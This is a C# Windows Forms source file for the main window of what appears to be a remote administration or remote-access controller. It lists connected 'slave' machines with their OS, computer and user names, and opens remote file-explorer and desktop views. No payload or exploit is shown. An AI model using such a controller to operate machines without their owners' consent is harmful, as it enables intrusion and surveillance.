using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Numerics;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Controller.Handlers;

namespace Controller
{
    public partial class MainForm : Form
    {
        private readonly Commander _commander;

        public MainForm()
        {
            InitializeComponent();

            Trace.Listeners.Add(new TextWriterTraceListener(new TextBoxWriter(textBoxLog)));
            
            _commander = new Commander();
            _commander.SlaveDisconnected += SlaveDisconnected;
            _commander.SlaveConnected += SlaveConnected;
            _commander.Start();

            var guid = new Guid("1d5be4b5-fa4a-452d-9cdd-5db35105e7eb");
            var bytes = guid.ToByteArray();

            var data1 = BitConverter.ToUInt32(bytes, 0);
            var data2 = BitConverter.ToUInt16(bytes, 4);
            var data3 = BitConverter.ToUInt16(bytes, 6);
            var data4 = BitConverter.ToUInt64(bytes, 8);

            var b = BitConverter.GetBytes(data4);
        }

        private void SlaveDisconnected(object sender, SlaveEventArgs slaveEventArgs)
        {
            slaveEventArgs.Slave.SlaveInfoUpdated += SlaveInfoUpdated;
            listViewSlaves.Invoke((MethodInvoker)(() =>
            {
                ListViewItem toRemove;
                if ((toRemove = listViewSlaves.Items.Cast<ListViewItem>().FirstOrDefault(item => item.SubItems[1].Text == slaveEventArgs.Slave.Client.ClientHandle.ToString())) != default(ListViewItem))
                    listViewSlaves.Items.Remove(toRemove);
            }));
        }

        private void SlaveConnected(object sender, SlaveEventArgs slaveEventArgs)
        {
            slaveEventArgs.Slave.SlaveInfoUpdated += SlaveInfoUpdated;
            listViewSlaves.Invoke((MethodInvoker) (() =>
            {
                listViewSlaves.Items.Add(new ListViewItem(new[]
                {
                    listViewSlaves.Items.Count.ToString(),
                    slaveEventArgs.Slave.Client.ClientHandle.ToString(),
                    "-",
                    slaveEventArgs.Slave.LocalEndPoint.ToString(),
                    slaveEventArgs.Slave.RemoteEndPoint.ToString(),
                    "-"
                }));
            }));
        }

        private void SlaveInfoUpdated(object sender, SlaveEventArgs slaveEventArgs)
        {
            slaveEventArgs.Slave.SlaveInfoUpdated += SlaveInfoUpdated;
            listViewSlaves.Invoke((MethodInvoker)(() =>
            {
                ListViewItem toFind;
                if (
                    (toFind =
                        listViewSlaves.Items.Cast<ListViewItem>()
                            .FirstOrDefault(
                                item => item.SubItems[1].Text == slaveEventArgs.Slave.Client.ClientHandle.ToString())) !=
                    default(ListViewItem))
                {
                    toFind.SubItems[2].Text = slaveEventArgs.Slave.OS;
                    toFind.SubItems[5].Text = String.Format("{0}\\\\{1}", slaveEventArgs.Slave.ComputerName,
                        slaveEventArgs.Slave.UserName);
                }
            }));
        }

        private void listViewSlaves_DoubleClick(object sender, EventArgs e)
        {
            
        }

        private void buttonExplorer_Click(object sender, EventArgs e)
        {
            if (listViewSlaves.SelectedItems.Count < 1)
                return;

            var clientHandle = new IntPtr(Convert.ToInt32(listViewSlaves.SelectedItems[0].SubItems[1].Text));
            var slave = _commander.GetSlave(clientHandle);
            if (slave == null)
                return;

            new ExplorerForm(slave.Explorer).Show();
        }

        private void buttonDesktop_Click(object sender, EventArgs e)
        {
            if (listViewSlaves.SelectedItems.Count < 1)
                return;

            var clientHandle = new IntPtr(Convert.ToInt32(listViewSlaves.SelectedItems[0].SubItems[1].Text));
            var slave = _commander.GetSlave(clientHandle);
            if (slave == null)
                return;

            new DesktopForm(slave.Desktop).Show();
        }
    }
}
